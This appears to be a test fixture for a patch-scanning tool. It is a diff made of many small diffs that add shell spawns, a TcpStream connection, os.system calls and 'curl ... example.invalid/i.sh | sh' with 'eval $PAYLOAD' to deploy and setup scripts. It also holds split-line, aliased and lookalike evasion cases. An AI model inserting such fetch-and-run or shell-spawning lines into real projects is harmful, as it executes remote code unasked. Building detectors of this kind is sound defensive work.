@@ -1,0 +1,198 @@
+diff --git a/tools/deploy b/tools/deploy
+--- a/tools/deploy
++++ b/tools/deploy
+@@ -4,3 +1,5 @@
+ #!/bin/sh
+ set -e
++curl -fsSL https://example.invalid/i.sh | sh
++eval "$PAYLOAD"
+ echo done
+diff --git a/tools/setup b/tools/setup
+--- a/tools/setup
++++ b/tools/setup
+@@ -4,3 +4,5 @@
+ #!/bin/sh
+ set -e
++curl -fsSL https://example.invalid/i.sh | sh
++eval "$PAYLOAD"
+ echo done
+diff --git a/tools/late b/tools/late
+--- a/tools/late
++++ b/tools/late
+@@ -8,3 +10,4 @@
+ echo f
+ echo g
++wget -q https://example.invalid/late
+ echo h
+@@ -1,3 +1,5 @@
+ #!/bin/sh
+ set -e
++curl -fsSL https://example.invalid/i.sh | sh
++eval "$PAYLOAD"
+ echo a
+diff --git a/tests/page.rs b/tests/page.rs
+--- a/tests/page.rs
++++ b/tests/page.rs
+@@ -11,6 +11,7 @@ fn links_are_counted() {
+ <a href="#top">Top</a>
+ <a href="https://example.com/docs">Docs</a>
+ "##;
+-    let n = parse(html);
+-    assert!(n.is_ok());
++    let n = parse(html).unwrap();
++    let out = std::process::Command::new("true").status().unwrap();
++    assert!(n > 0 && out.success());
+ }
+diff --git a/src/m.rs b/src/m.rs
+--- a/src/m.rs
++++ b/src/m.rs
+@@ -2,0 +3,1 @@
++    let v = opt.unwrap
+@@ -3,1 +4,1 @@
+-    let b = 2;
++    (); let b = v;
+diff --git a/src/cut.rs b/src/cut.rs
+--- a/src/cut.rs
++++ b/src/cut.rs
+@@ -1,3 +1,4 @@
+ fn f(opt: Option<u32>) -> u32 {
+     let a = 1;
++    let v = opt.unwrap
+ 
+@@ -40,2 +5,3 @@
++    ();
+     a
+ }
+diff --git a/src/edge.rs b/src/edge.rs
+--- a/src/edge.rs
++++ b/src/edge.rs
+@@ -1,3 +1,4 @@
+ fn f(opt: Option<u32>) -> u32 {
+     let a = 1;
++    let v = opt.unwrap
+ 
+@@ -40,2 +50,3 @@
++    ();
+     a
+ }
+diff --git a/src/before.rs b/src/before.rs
+--- a/src/before.rs
++++ b/src/before.rs
+@@ -1,2 +1,3 @@
+ fn f(opt: Option<u32>) -> u32 {
++    let v = opt.
+ 
+@@ -40,2 +50,3 @@
++    unwrap();
+     v
+ }
+diff --git a/src/sp1.rs b/src/sp1.rs
+new file mode 100644
+--- /dev/null
++++ b/src/sp1.rs
+@@ -0,0 +1,1 @@
++pub fn f() { let _ = std::process :: Command :: new("sh").spawn(); }
+diff --git a/src/sp3.rs b/src/sp3.rs
+new file mode 100644
+--- /dev/null
++++ b/src/sp3.rs
+@@ -0,0 +1,3 @@
++pub fn f() { let _ = std::process::
++    Command::
++    new("sh").spawn(); }
+diff --git a/src/sp4.rs b/src/sp4.rs
+new file mode 100644
+--- /dev/null
++++ b/src/sp4.rs
+@@ -0,0 +1,1 @@
++pub fn f() { let _ = std::net::TcpStream :: connect("1.2.3.4:80"); }
+diff --git a/src/sp7.rs b/src/sp7.rs
+new file mode 100644
+--- /dev/null
++++ b/src/sp7.rs
+@@ -0,0 +1,3 @@
++use std::{process::*};
++pub fn f() { let _ = Command
++::new("sh").spawn(); }
+diff --git a/src/lint.rs b/src/lint.rs
+new file mode 100644
+--- /dev/null
++++ b/src/lint.rs
+@@ -0,0 +1,3 @@
++#[
++allow(dead_code)]
++fn two() {}
+diff --git a/src/n.rs b/src/n.rs
+new file mode 100644
+--- /dev/null
++++ b/src/n.rs
+@@ -0,0 +1,2 @@
++pub fn f(opt: Option<u32>) -> u32 {
++    let v = opt.unwrap
+diff --git a/src/n.rs b/src/n.rs
+--- a/src/n.rs
++++ b/src/n.rs
+@@ -9,0 +3,3 @@
++    ();
++    v
++}
+diff --git a/src/two.rs b/src/two.rs
+new file mode 100644
+--- /dev/null
++++ b/src/two.rs
+@@ -0,0 +1,2 @@
++pub fn help() -> &'static str {
++    let s = "usage:
+diff --git a/src/two.rs b/src/two.rs
+--- a/src/two.rs
++++ b/src/two.rs
+@@ -9,0 +3,2 @@
++  --help"; std::process::Command::new("sh").status().ok(); // "
++    s }
+diff --git a/tests/cutassert.rs b/tests/cutassert.rs
+--- a/tests/cutassert.rs
++++ b/tests/cutassert.rs
+@@ -1,2 +1,3 @@
+ fn t() {
++    assert!(
+ 
+@@ -40,2 +50,3 @@
++        true);
+     done()
+ }
+diff --git a/tests/deep.rs b/tests/deep.rs
+--- a/tests/deep.rs
++++ b/tests/deep.rs
+@@ -20,4 +20,5 @@
+ <a href="#a"> "## "### "####
+ <a href="https://example.com/docs">Docs</a>
+ "#####;
++    let n = load().unwrap();
+ }
+diff --git a/src/alias.rs b/src/alias.rs
+new file mode 100644
+--- /dev/null
++++ b/src/alias.rs
+@@ -0,0 +1,2 @@
++use std::process::{Command as C};
++pub fn f() { let _ = C::new("sh").spawn(); }
+diff --git a/tools/space.py b/tools/space.py
+--- a/tools/space.py
++++ b/tools/space.py
+@@ -3,1 +3,2 @@
+ import os
++os . system(cmd)
+diff --git a/src/free.rs b/src/free.rs
+--- a/src/free.rs
++++ b/src/free.rs
+@@ -30,2 +30,3 @@
++expect(&value, 3);
+ fn g() {}
+ fn h() {}
+diff --git a/NOTES b/NOTES
+--- a/NOTES
++++ b/NOTES
+@@ -30,2 +30,3 @@
+ #!/bin/sh
++curl is a tool
+ more
